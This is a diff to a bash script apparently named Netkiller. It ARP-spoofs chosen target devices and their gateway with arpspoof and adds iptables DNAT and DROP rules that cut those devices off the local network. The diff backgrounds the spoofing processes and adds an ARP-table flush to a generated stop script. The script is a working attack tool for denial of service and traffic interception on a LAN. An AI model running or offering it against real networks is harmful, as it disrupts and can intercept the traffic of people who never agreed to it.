@@ -160,15 +160,14 @@ for TARGET in "${TARGETS[@]}"; do
         sudo iptables -P FORWARD DROP
         sudo iptables -t nat -A PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
         sudo iptables -t nat -A PREROUTING -d "$TARGET" -j DNAT --to-destination "$GATEWAY"
-        sudo iptables -A FORWARD -d "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
-        sudo iptables -A FORWARD -d "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
-        sudo iptables -A FORWARD -d "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
         sudo iptables -A FORWARD -s "$TARGET" -j DROP
         sudo iptables -A FORWARD -d "$TARGET" -j DROP
      
        # Bidirectional ARP Spoofing
+       (
         sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
+       ) &
 done
 
 echo ""
@@ -178,6 +177,8 @@ echo "Blocking rules applied."
 cat > /bin/netkiller-stop << EOF
 #!/bin/bash
 echo "Unblocking the Device..."
+    # Flush arp tables
+    sudo ip -s -s neigh flush all >/dev/null
     # Kill all arpspoof processes
     sudo pkill arpspoof
     # Flush iptables rules
@@ -186,7 +187,7 @@ echo "Unblocking the Device..."
 sleep 2s
 echo "Done!"
 EOF
-chmod 755 /bin/netkiller-stop
+sudo chmod 755 /bin/netkiller-stop
 
 echo ""
 echo "Netkiller is running in the Background!"
